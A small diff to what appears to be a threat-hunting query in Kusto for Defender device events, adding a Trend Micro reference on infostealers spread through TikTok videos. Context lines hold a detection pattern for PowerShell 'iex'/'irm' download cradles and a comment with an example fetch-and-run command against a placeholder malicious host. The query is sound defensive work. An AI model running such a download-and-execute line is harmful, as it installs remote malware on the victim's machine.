@@ -23,3 +23,7 @@ DeviceEvents
 | where (Command has_all ("iex","irm","https://") or  Command has_all ('Invoke-Expression','Invoke-RestMethod','https://')) //iex (irm https://malicious.site/mal)
 | join (DeviceProcessEvents) on InitiatingProcessFileName,InitiatingProcessId 
 ```
+
+References:  
+https://www.trendmicro.com/en_us/research/25/e/tiktok-videos-infostealers.html  
+
